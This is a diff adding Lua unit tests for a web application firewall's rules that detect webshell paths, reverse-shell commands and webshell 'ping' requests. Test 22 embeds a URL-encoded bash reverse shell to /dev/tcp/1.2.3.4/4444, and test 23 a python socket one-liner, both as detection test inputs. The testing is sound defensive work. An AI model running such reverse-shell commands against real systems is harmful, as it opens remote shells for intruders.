@@ -340,6 +340,132 @@ do
   check(hits[1].waf_rule_id == 320, "18: skip_rule_ids — hits[1] is RCE not traversal")
 end
 
+-- ── Test 19: W1 webshell_path — known drop name fires (rule 410) ─────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_webshell_path", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    uri = "/wp-content/uploads/c99.php",
+  }))
+  check(hit == true,                          "19: webshell_path — hit")
+  check(reason == "WAF_WEBSHELL:PATH:c99.php", "19: webshell_path — reason")
+  check(action == "logonly",                   "19: webshell_path — logonly")
+  check(rule_id == 410,                        "19: webshell_path — rule id 410")
+end
+
+-- ── Test 20: W1 webshell_path — case-insensitive basename match ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_webshell_path", "logonly")
+
+  local hit, reason = waf.check(fresh_ctx({ uri = "/UPLOADS/R57.PHP?cmd=id" }))
+  check(hit == true,                          "20: webshell_path — case-insensitive hit")
+  check(reason == "WAF_WEBSHELL:PATH:r57.php", "20: webshell_path — basename lowered")
+end
+
+-- ── Test 21: W1 webshell_path — non-matching path doesn't fire ───────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_webshell_path", "logonly")
+
+  local hit = waf.check(fresh_ctx({ uri = "/help/r57.php-explained.html" }))
+  check(hit == false, "21: webshell_path — basename mismatch, no hit")
+end
+
+-- ── Test 22: R1 reverse_shell — bash /dev/tcp in args (rule 322) ─────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_reverse_shell", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    uri  = "/cgi-bin/exploit.cgi",
+    args = "cmd=bash%20-i%20%3E%26%20/dev/tcp/1.2.3.4/4444",
+  }))
+  check(hit == true,                                "22: reverse_shell — hit")
+  check(reason and reason:find("WAF_RCE:REVERSE_SHELL:BASH_TCP", 1, true),
+                                                    "22: reverse_shell — reason")
+  check(action == "logonly",                        "22: reverse_shell — logonly")
+  check(rule_id == 322,                             "22: reverse_shell — rule id 322")
+end
+
+-- ── Test 23: R1 reverse_shell — python -c socket in POST body ────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_reverse_shell", "logonly")
+
+  local hit, reason = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "code=python -c 'import socket;s=socket.socket()'",
+  }))
+  check(hit == true,                                                "23: reverse_shell — body hit")
+  check(reason and reason:find("REVERSE_SHELL:PY_SOCKET", 1, true), "23: reverse_shell — PY_SOCKET tag")
+end
+
+-- ── Test 24: R1 reverse_shell — benign string doesn't fire ───────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_reverse_shell", "logonly")
+
+  -- "import socket" alone (without "python -c") must not match.
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "Hello, this article explains how to import socket in python.",
+  }))
+  check(hit == false, "24: reverse_shell — bare 'import socket' prose, no hit")
+end
+
+-- ── Test 25: B5 webshell_ping — POST + empty UA + CL:0 + .php (rule 411) ─────
+do
+  disable_all_rules()
+  waf.set_rule("rule_webshell_ping", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    uri    = "/uploads/x.php",
+    headers = {
+      ["User-Agent"]     = "",
+      ["Content-Length"] = "0",
+    },
+  }))
+  check(hit == true,                       "25: webshell_ping — hit")
+  check(reason == "WAF_WEBSHELL:PING",     "25: webshell_ping — reason")
+  check(action == "logonly",               "25: webshell_ping — logonly")
+  check(rule_id == 411,                    "25: webshell_ping — rule id 411")
+end
+
+-- ── Test 26: B5 webshell_ping — non-php URI doesn't fire ─────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_webshell_ping", "logonly")
+
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    uri    = "/api/event",
+    headers = {
+      ["User-Agent"]     = "",
+      ["Content-Length"] = "0",
+    },
+  }))
+  check(hit == false, "26: webshell_ping — non-php URI, no hit")
+end
+
+-- ── Test 27: B5 webshell_ping — UA present doesn't fire (legit POST) ─────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_webshell_ping", "logonly")
+
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    uri    = "/uploads/x.php",
+    headers = {
+      ["User-Agent"]     = "Mozilla/5.0",
+      ["Content-Length"] = "0",
+    },
+  }))
+  check(hit == false, "27: webshell_ping — non-empty UA, no hit")
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
